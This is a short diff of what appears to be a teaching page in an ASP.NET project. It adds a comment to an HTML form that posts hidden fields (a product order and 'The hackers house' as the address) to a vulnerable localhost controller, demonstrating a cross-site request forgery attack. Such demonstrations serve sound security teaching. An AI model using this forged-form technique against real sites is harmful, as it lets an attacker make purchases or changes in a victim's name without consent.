@@ -5,6 +5,7 @@
 
 <h2>This page attack to a vulnerable CSRF controller</h2>
 
+@*The formulary targets the Action method in the controller with hidden inputs to secretly send the information and perform the attack.*@
 <form action="http://localhost:57336/CSRF/Buy" method="post">
     <input type="hidden" name="product" value="10 Iphones X 10.000" />
     <input type="hidden" name="address" value="The hackers house" />
